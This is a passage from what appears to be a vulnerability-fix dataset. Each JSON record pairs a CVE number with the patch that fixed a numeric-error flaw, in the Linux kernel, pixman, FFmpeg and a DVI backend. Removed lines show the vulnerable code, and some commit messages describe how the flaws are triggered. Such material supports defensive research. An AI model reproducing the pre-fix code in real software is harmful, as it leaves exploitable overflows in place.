bitmap)) != 0)\n \t\tgoto out;\n \tif ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)\n@@ -4979,18 +4982,30 @@ static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,\n \t\tsize_t hdrlen;\n \t\tu32 recvd;\n \n+\t\t\/* The bitmap (xdr len + bitmaps) and the attr xdr len words\n+\t\t * are stored with the acl data to handle the problem of\n+\t\t * variable length bitmaps.*\/\n+\t\txdr->p = bm_p;\n+\t\tres->acl_data_offset = be32_to_cpup(bm_p) + 2;\n+\t\tres->acl_data_offset <<= 2;\n+\n \t\t\/* We ignore &savep and don't do consistency checks on\n \t\t * the attr length.  Let userspace figure it out.... *\/\n \t\thdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;\n+\t\tattrlen += res->acl_data_offset;\n \t\trecvd = req->rq_rcv_buf.len - hdrlen;\n \t\tif (attrlen > recvd) {\n-\t\t\tdprintk(\"NFS: server cheating in getattr\"\n-\t\t\t\t\t\" acl reply: attrlen %u > recvd %u\\n\",\n+\t\t\tif (res->acl_flags & NFS4_ACL_LEN_REQUEST) {\n+\t\t\t\t\/* getxattr interface called with a NULL buf *\/\n+\t\t\t\tres->acl_len = attrlen;\n+\t\t\t\tgoto out;\n+\t\t\t}\n+\t\t\tdprintk(\"NFS: acl reply: attrlen %u > recvd %u\\n\",\n \t\t\t\t\tattrlen, recvd);\n \t\t\treturn -EINVAL;\n \t\t}\n \t\txdr_read_pages(xdr, attrlen);\n-\t\t*acl_len = attrlen;\n+\t\tres->acl_len = attrlen;\n \t} else\n \t\tstatus = -EOPNOTSUPP;\n \n@@ -6028,7 +6043,7 @@ nfs4_xdr_dec_getacl(struct rpc_rqst *rqstp, struct xdr_stream *xdr,\n \tstatus = decode_putfh(xdr);\n \tif (status)\n \t\tgoto out;\n-\tstatus = decode_getacl(xdr, rqstp, &res->acl_len);\n+\tstatus = decode_getacl(xdr, rqstp, res);\n \n out:\n \treturn status;\ndiff --git a\/include\/linux\/nfs_xdr.h b\/include\/linux\/nfs_xdr.h\nindex 2a7c533be5dd..6c898afe6095 100644\n--- a\/include\/linux\/nfs_xdr.h\n+++ b\/include\/linux\/nfs_xdr.h\n@@ -602,11 +602,16 @@ struct nfs_getaclargs {\n \tsize_t\t\t\t\tacl_len;\n \tunsigned int\t\t\tacl_pgbase;\n \tstruct page **\t\t\tacl_pages;\n+\tstruct page *\t\t\tacl_scratch;\n \tstruct nfs4_sequence_args \tseq_args;\n };\n \n+\/* getxattr ACL interface flags *\/\n+#define NFS4_ACL_LEN_REQUEST\t0x0001\t\/* zero length getxattr buffer *\/\n struct nfs_getaclres {\n \tsize_t\t\t\t\tacl_len;\n+\tsize_t\t\t\t\tacl_data_offset;\n+\tint\t\t\t\tacl_flags;\n \tstruct nfs4_sequence_res\tseq_res;\n };\n \ndiff --git a\/include\/linux\/sunrpc\/xdr.h b\/include\/linux\/sunrpc\/xdr.h\nindex a20970ef9e4e..af70af333546 100644\n--- a\/include\/linux\/sunrpc\/xdr.h\n+++ b\/include\/linux\/sunrpc\/xdr.h\n@@ -191,6 +191,8 @@ extern int xdr_decode_array2(struct xdr_buf *buf, unsigned int base,\n \t\t\t     struct xdr_array2_desc *desc);\n extern int xdr_encode_array2(struct xdr_buf *buf, unsigned int base,\n \t\t\t     struct xdr_array2_desc *desc);\n+extern void _copy_from_pages(char *p, struct page **pages, size_t pgbase,\n+\t\t\t     size_t len);\n \n \/*\n  * Provide some simple tools for XDR buffer overflow-checking etc.\ndiff --git a\/net\/sunrpc\/xdr.c b\/net\/sunrpc\/xdr.c\nindex 277ebd4bf095..593f4c605305 100644\n--- a\/net\/sunrpc\/xdr.c\n+++ b\/net\/sunrpc\/xdr.c\n@@ -296,7 +296,7 @@ _copy_to_pages(struct page **pages, size_t pgbase, const char *p, size_t len)\n  * Copies data into an arbitrary memory location from an array of pages\n  * The copy is assumed to be non-overlapping.\n  *\/\n-static void\n+void\n _copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)\n {\n \tstruct page **pgfrom;\n@@ -324,6 +324,7 @@ _copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)\n \n \t} while ((len -= copy) != 0);\n }\n+EXPORT_SYMBOL_GPL(_copy_from_pages);\n \n \/*\n  * xdr_shrink_bufhead\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-4656","CWE_ID":"189","category":"security","commit_id":"883a1d49f0d77d30012f114b2e19fc141beb3e8e","commit_message":"From 883a1d49f0d77d30012f114b2e19fc141beb3e8e Mon Sep 17 00:00:00 2001\nFrom: Lars-Peter Clausen <lars@metafoo.de>\nDate: Wed, 18 Jun 2014 13:32:35 +0200\nSubject: [PATCH] ALSA: control: Make sure that id->index does not overflow\n\nThe ALSA control code expects that the range of assigned indices to a control is\ncontinuous and does not overflow. Currently there are no checks to enforce this.\nIf a control with a overflowing index range is created that control becomes\neffectively inaccessible and unremovable since snd_ctl_find_id() will not be\nable to find it. This patch adds a check that makes sure that controls with a\noverflowing index range can not be created.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound\/core\/control.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/sound\/core\/control.c b\/sound\/core\/control.c\nindex 8d6e4bae74074..f0b0e14497a5d 100644\n--- a\/sound\/core\/control.c\n+++ b\/sound\/core\/control.c\n@@ -342,6 +342,9 @@ int snd_ctl_add(struct snd_card *card, struct snd_kcontrol *kcontrol)\n \tif (snd_BUG_ON(!card || !kcontrol->info))\n \t\tgoto error;\n \tid = kcontrol->id;\n+\tif (id.index > UINT_MAX - kcontrol->count)\n+\t\tgoto error;\n+\n \tdown_write(&card->controls_rwsem);\n \tif (snd_ctl_find_id(card, &id)) {\n \t\tup_write(&card->controls_rwsem);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-5244","CWE_ID":"189","category":"security","commit_id":"d4139205b010ed06310d14284e63114e88ec6de2","commit_message":"From d4139205b010ed06310d14284e63114e88ec6de2 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jos=C3=A9=20Aliste?= <jaliste@src.gnome.org>\nDate: Tue, 7 Dec 2010 15:56:47 -0300\nSubject: [PATCH] backends: Fix several security issues in the dvi-backend.\n\nSee CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.\n---\n backend\/dvi\/mdvi-lib\/afmparse.c |  2 +-\n backend\/dvi\/mdvi-lib\/dviread.c  |  4 ++++\n backend\/dvi\/mdvi-lib\/pk.c       | 11 ++++++++++-\n backend\/dvi\/mdvi-lib\/tfmfile.c  |  3 ++-\n backend\/dvi\/mdvi-lib\/vf.c       |  6 ++++++\n 5 files changed, 23 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 164366b0..361e23d6 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -160,7 +160,7 @@ static char *token(FILE *stream)\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\ndiff --git a\/backend\/dvi\/mdvi-lib\/dviread.c b\/backend\/dvi\/mdvi-lib\/dviread.c\nindex cd8cfa91..d0143205 100644\n--- a\/backend\/dvi\/mdvi-lib\/dviread.c\n+++ b\/backend\/dvi\/mdvi-lib\/dviread.c\n@@ -1507,6 +1507,10 @@ int\tspecial(DviContext *dvi, int opcode)\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;\ndiff --git a\/backend\/dvi\/mdvi-lib\/pk.c b\/backend\/dvi\/mdvi-lib\/pk.c\nindex a5791869..08377e63 100644\n--- a\/backend\/dvi\/mdvi-lib\/pk.c\n+++ b\/backend\/dvi\/mdvi-lib\/pk.c\n@@ -469,6 +469,15 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t\/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*\/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -512,7 +521,7 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t}\n \n \t\/* resize font char data *\/\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,\ndiff --git a\/backend\/dvi\/mdvi-lib\/tfmfile.c b\/backend\/dvi\/mdvi-lib\/tfmfile.c\nindex 73ebf26a..8c2a30b2 100644\n--- a\/backend\/dvi\/mdvi-lib\/tfmfile.c\n+++ b\/backend\/dvi\/mdvi-lib\/tfmfile.c\n@@ -172,7 +172,8 @@ int\ttfm_load_file(const char *filename, TFMInfo *info)\n \t\/* We read the entire TFM file into core *\/\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t\/* according to the spec, TFM files are smaller than 16K *\/\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t\/* allocate a word-aligned buffer to hold the file *\/\ndiff --git a\/backend\/dvi\/mdvi-lib\/vf.c b\/backend\/dvi\/mdvi-lib\/vf.c\nindex fb498476..a5ae3bbe 100644\n--- a\/backend\/dvi\/mdvi-lib\/vf.c\n+++ b\/backend\/dvi\/mdvi-lib\/vf.c\n@@ -165,6 +165,12 @@ static int vf_load_font(DviParams *params, DviFont *font)\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\/* TeX engines do not support char codes bigger than 65535 *\/\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-6763","CWE_ID":"189","category":"security","commit_id":"7314e613d5ff9f0934f7a0f74ed7973b903315d1","commit_message":"From 7314e613d5ff9f0934f7a0f74ed7973b903315d1 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Tue, 29 Oct 2013 10:21:34 -0700\nSubject: Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.\n---\n drivers\/uio\/uio.c        | 17 +++++++++++++++--\n drivers\/video\/au1100fb.c | 26 +-------------------------\n drivers\/video\/au1200fb.c | 23 +----------------------\n 3 files changed, 17 insertions(+), 49 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/uio\/uio.c b\/drivers\/uio\/uio.c\nindex ba475632c5fa..0e808cf91d97 100644\n--- a\/drivers\/uio\/uio.c\n+++ b\/drivers\/uio\/uio.c\n@@ -642,16 +642,29 @@ static int uio_mmap_physical(struct vm_area_struct *vma)\n {\n \tstruct uio_device *idev = vma->vm_private_data;\n \tint mi = uio_find_mem_index(vma);\n+\tstruct uio_mem *mem;\n \tif (mi < 0)\n \t\treturn -EINVAL;\n+\tmem = idev->info->mem + mi;\n \n-\tvma->vm_ops = &uio_physical_vm_ops;\n+\tif (vma->vm_end - vma->vm_start > mem->size)\n+\t\treturn -EINVAL;\n \n+\tvma->vm_ops = &uio_physical_vm_ops;\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \n+\t\/*\n+\t * We cannot use the vm_iomap_memory() helper here,\n+\t * because vma->vm_pgoff is the map index we looked\n+\t * up above in uio_find_mem_index(), rather than an\n+\t * actual page offset into the mmap.\n+\t *\n+\t * So we just do the physical mmap without a page\n+\t * offset.\n+\t *\/\n \treturn remap_pfn_range(vma,\n \t\t\t       vma->vm_start,\n-\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,\n+\t\t\t       mem->addr >> PAGE_SHIFT,\n \t\t\t       vma->vm_end - vma->vm_start,\n \t\t\t       vma->vm_page_prot);\n }\ndiff --git a\/drivers\/video\/au1100fb.c b\/drivers\/video\/au1100fb.c\nindex a54ccdc4d661..22ad85242e5b 100644\n--- a\/drivers\/video\/au1100fb.c\n+++ b\/drivers\/video\/au1100fb.c\n@@ -361,37 +361,13 @@ void au1100fb_fb_rotate(struct fb_info *fbi, int angle)\n int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n {\n \tstruct au1100fb_device *fbdev;\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \n \tfbdev = to_au1100fb_device(fbi);\n \n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= (6 << 9); \/\/CCA=6\n \n-\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\tvma->vm_end - vma->vm_start,\n-\t\t\t\tvma->vm_page_prot)) {\n-\t\treturn -EAGAIN;\n-\t}\n-\n-\treturn 0;\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n \n static struct fb_ops au1100fb_ops =\ndiff --git a\/drivers\/video\/au1200fb.c b\/drivers\/video\/au1200fb.c\nindex 301224ecc950..1d02897d17f2 100644\n--- a\/drivers\/video\/au1200fb.c\n+++ b\/drivers\/video\/au1200fb.c\n@@ -1233,34 +1233,13 @@ static int au1200fb_fb_blank(int blank_mode, struct fb_info *fbi)\n  * method mainly to allow the use of the TLB streaming flag (CCA=6)\n  *\/\n static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n-\n {\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \tstruct au1200fb_device *fbdev = info->par;\n \n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; \/* CCA=7 *\/\n \n-\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\t  vma->vm_end - vma->vm_start,\n-\t\t\t\t  vma->vm_page_prot);\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n \n static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9766","CWE_ID":"189","category":"security","commit_id":"857e40f3d2bc2cfb714913e0cd7e6184cf69aca3","commit_message":"From 857e40f3d2bc2cfb714913e0cd7e6184cf69aca3 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?S=C3=B8ren=20Sandmann?= <ssp@redhat.com>\nDate: Wed, 9 Apr 2014 14:14:12 -0400\nSubject: create_bits(): Cast the result of height * stride to size_t\n\nIn create_bits() both height and stride are ints, so the result is\nalso an int, which will overflow if height or stride are big enough\nand size_t is bigger than int.\n\nThis patch simply casts height to size_t to prevent these overflows,\nwhich prevents the crash in:\n\n    https:\/\/bugzilla.redhat.com\/show_bug.cgi?id=972647\n\nIt's not even close to fixing the full problem of supporting big\nimages in pixman.\n\nSee also\n\n    https:\/\/bugs.freedesktop.org\/show_bug.cgi?id=69014\n---\n pixman\/pixman-bits-image.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/pixman\/pixman-bits-image.c b\/pixman\/pixman-bits-image.c\nindex f9121a3..dcdcc69 100644\n--- a\/pixman\/pixman-bits-image.c\n+++ b\/pixman\/pixman-bits-image.c\n@@ -926,7 +926,7 @@ create_bits (pixman_format_code_t format,\n     if (_pixman_multiply_overflows_size (height, stride))\n \treturn NULL;\n \n-    buf_size = height * stride;\n+    buf_size = (size_t)height * stride;\n \n     if (rowstride_bytes)\n \t*rowstride_bytes = stride;\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9683","CWE_ID":"189","category":"security","commit_id":"942080643bce061c3dd9d5718d3b745dcb39a8bc","commit_message":"From 942080643bce061c3dd9d5718d3b745dcb39a8bc Mon Sep 17 00:00:00 2001\nFrom: Michael Halcrow <mhalcrow@google.com>\nDate: Wed, 26 Nov 2014 09:09:16 -0800\nSubject: [PATCH] eCryptfs: Remove buggy and unnecessary write in file name\n decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the\nend of the allocated buffer during encrypted filename decoding. This\nfix corrects the issue by getting rid of the unnecessary 0 write when\nthe current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com>\nReported-by: Dmitry Chernenkov <dmitryc@google.com>\nSuggested-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>\n---\n fs\/ecryptfs\/crypto.c | 1 -\n 1 file changed, 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/ecryptfs\/crypto.c b\/fs\/ecryptfs\/crypto.c\nindex 2f6735dbf1a9d..31b148f3e7729 100644\n--- a\/fs\/ecryptfs\/crypto.c\n+++ b\/fs\/ecryptfs\/crypto.c\n@@ -1917,7 +1917,6 @@ ecryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n \t\t\tbreak;\n \t\tcase 2:\n \t\t\tdst[dst_byte_offset++] |= (src_byte);\n-\t\t\tdst[dst_byte_offset] = 0;\n \t\t\tcurrent_bit_offset = 0;\n \t\t\tbreak;\n \t\t}\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-2070","CWE_ID":"189","category":"security","commit_id":"8b8a321ff72c785ed5e8b4cf6eda20b35d427390","commit_message":"From 8b8a321ff72c785ed5e8b4cf6eda20b35d427390 Mon Sep 17 00:00:00 2001\nFrom: Yuchung Cheng <ycheng@google.com>\nDate: Wed, 6 Jan 2016 12:42:38 -0800\nSubject: tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode\nconditionally\") introduced a bug that cwnd may become 0 when both\ninflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead\nto a div-by-zero if the connection starts another cwnd reduction\nphase by setting tp->prior_cwnd to the current cwnd (0) in\ntcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or\nsacked. Then cwnd must be positive in all cases as long as ssthresh\nis positive:\n\n1) The proportional reduction mode\n   inflight > ssthresh > 0\n\n2) The reduction bound mode\n  a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh\n     sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0.\nWe check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common\nevents.  For example, the connection is terminating an ECN-triggered\ncwnd reduction with an inflight 0, then it receives reordered\/old\nACKs or DSACKs from prior transmission (which acks nothing). Or the\nconnection is in fast recovery stage that marks everything lost,\nbut fails to retransmit due to local issues, then receives data\npackets from other end which acks nothing.\n\nFixes: 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")\nReported-by: Oleksandr Natalenko <oleksandr@natalenko.name>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv4\/tcp_input.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/net\/ipv4\/tcp_input.c b\/net\/ipv4\/tcp_input.c\nindex 2d656eef7f8e..d4c51158470f 100644\n--- a\/net\/ipv4\/tcp_input.c\n+++ b\/net\/ipv4\/tcp_input.c\n@@ -2478,6 +2478,9 @@ static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n \tint newly_acked_sacked = prior_unsacked -\n \t\t\t\t (tp->packets_out - tp->sacked_out);\n \n+\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))\n+\t\treturn;\n+\n \ttp->prr_delivered += newly_acked_sacked;\n \tif (delta < 0) {\n \t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-7013","CWE_ID":"189","category":"security","commit_id":"821a5938d100458f4d09d634041b05c860554ce0","commit_message":"From 821a5938d100458f4d09d634041b05c860554ce0 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Sun, 15 Sep 2013 16:33:27 +0200\nSubject: [PATCH] avcodec\/g2meet: Fix order of align and pixel size\n multiplication.\n\nFixes out of array accesses\nFixes Ticket2922\n\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/g2meet.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/g2meet.c b\/libavcodec\/g2meet.c\nindex 9a228b8873f..ccccf218346 100644\n--- a\/libavcodec\/g2meet.c\n+++ b\/libavcodec\/g2meet.c\n@@ -453,7 +453,7 @@ static int g2m_init_buffers(G2MContext *c)\n     if (!c->synth_tile || !c->jpeg_tile ||\n         c->old_tile_w < c->tile_width ||\n         c->old_tile_h < c->tile_height) {\n-        c->tile_stride = FFALIGN(c->tile_width * 3, 16);\n+        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;\n         aligned_height = FFALIGN(c->tile_height,    16);\n         av_free(c->synth_tile);\n         av_free(c->jpeg_tile);\n","owner":"FFmpeg","repo":"FFmpeg","source":"cve"},{"CVE_ID":"CVE-2008-3272","CWE_ID":"189","category":"security","commit_id":"82e68f7ffec3800425f2391c8c86277606860442","commit_message":"From 82e68f7ffec3800425f2391c8c86277606860442 Mon Sep 17 00:00:00 2001\nFrom: Willy Tarreau <w@1wt.eu>\nDate: Sat, 2 Aug 2008 18:25:16 +0200\nSubject: sound: ensure device number is valid in snd_seq_oss_synth_make_info\n\nsnd_seq_oss_synth_make_info() incorrectly reports information\nto userspace without first checking for the validity of the\ndevice number, leading to possible information leak (CVE-2008-3272).\n\nReported-By: Tobias Klein <tk@trapkit.de>\nAcked-and-tested-by: Takashi Iwai <tiwai@suse.de>\nCc: stable@kernel.org\nSigned-off-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n sound\/core\/seq\/oss\/seq_oss_synth.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/sound\/core\/seq\/oss\/seq_oss_synth.c b\/sound\/core\/seq\/oss\/seq_oss_synth.c\nindex 558dadbf45f1..e024e4588b82 100644\n--- a\/sound\/core\/seq\/oss\/seq_oss_synth.c\n+++ b\/sound\/core\/seq\/oss\/seq_oss_synth.c\n@@ -604,6 +604,9 @@ snd_seq_oss_synth_make_info(struct seq_oss_devinfo *dp, int dev, struct synth_in\n {\n \tstruct seq_oss_synth *rec;\n \n+\tif (dev < 0 || dev >= dp->max_synthdev)\n+\t\treturn -ENXIO;\n+\n \tif (dp->synths[dev].is_midi) {\n \t\tstruct midi_info minf;\n \t\tsnd_seq_oss_midi_make_info(dp, dp->synths[dev].midi_mapped, &minf);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2007-4997","CWE_ID":"189","category":"security","commit_id":"04045f98e0457aba7d4e6736f37eed189c48a5f7","commit_message":"From 04045f98e0457aba7d4e6736f37eed189c48a5f7 Mon Sep 17 00:00:00 2001\nFrom: \"John W. Linville\" <linville@tuxdriver.com>\nDate: Mon, 1 Oct 2007 21:03:54 -0700\nSubject: [IEEE80211]: avoid integer underflow for runt rx frames\n\nReported by Chris Evans <scarybeasts@gmail.com>:\n\n> The summary is that an evil 80211 frame can crash out a victim's\n> machine. It only applies to drivers using the 80211 wireless code, and\n> only then to certain drivers (and even then depends on a card's\n> firmware not dropping a dubious packet). I must confess I'm not\n> keeping track of Linux wireless support, and the different protocol\n> stacks etc.\n>\n> Details are as follows:\n>\n> ieee80211_rx() does not explicitly check that \"skb->len >= hdrlen\".\n> There are other skb->len checks, but not enough to prevent a subtle\n> off-by-two error if the frame has the IEEE80211_STYPE_QOS_DATA flag\n> set.\n>\n> This leads to integer underflow and crash here:\n>\n> if (frag != 0)\n>    flen -= hdrlen;\n>\n> (flen is subsequently used as a memcpy length parameter).\n\nHow about this?\n\nSigned-off-by: John W. Linville <linville@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ieee80211\/ieee80211_rx.c | 6 ++++++\n 1 file changed, 6 insertions(+)\n\n","diff_code":"diff --git a\/net\/ieee80211\/ieee80211_rx.c b\/net\/ieee80211\/ieee80211_rx.c\nindex f2de2e48b021..6284c99b456e 100644\n--- a\/net\/ieee80211\/ieee80211_rx.c\n+++ b\/net\/ieee80211\/ieee80211_rx.c\n@@ -366,6 +366,12 @@ int ieee80211_rx(struct ieee80211_device *ieee, struct sk_buff *skb,\n \tfrag = WLAN_GET_SEQ_FRAG(sc);\n \thdrlen = ieee80211_get_hdrlen(fc);\n \n+\tif (skb->len < hdrlen) {\n+\t\tprintk(KERN_INFO \"%s: invalid SKB length %d\\n\",\n+\t\t\tdev->name, skb->len);\n+\t\tgoto rx_dropped;\n+\t}\n+\n \t\/* Put this code here so that we avoid duplicating it in all\n \t * Rx paths. - Jean II *\/\n #ifdef CONFIG_WIRELESS_EXT\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-3067","CWE_ID":"189","category":"security","commit_id":"75e1c70fc31490ef8a373ea2a4bea2524099b478","commit_message":"From 75e1c70fc31490ef8a373ea2a4bea2524099b478 Mon Sep 17 00:00:00 2001\nFrom: Jeff Moyer <jmoyer@redhat.com>\nDate: Fri, 10 Sep 2010 14:16:00 -0700\nSubject: aio: check for multiplication overflow in do_io_submit\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nTavis Ormandy pointed out that do_io_submit does not do proper bounds\nchecking on the passed-in iocb array:\n\n\u00a0 \u00a0 \u00a0 \u00a0if (unlikely(nr < 0))\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0return -EINVAL;\n\n\u00a0 \u00a0 \u00a0 \u00a0if (unlikely(!access_ok(VERIFY_READ, iocbpp, (nr*sizeof(iocbpp)))))\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0return -EFAULT; \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0^^^^^^^^^^^^^^^^^^\n\nThe attached patch checks for overflow, and if it is detected, the\nnumber of iocbs submitted is scaled down to a number that will 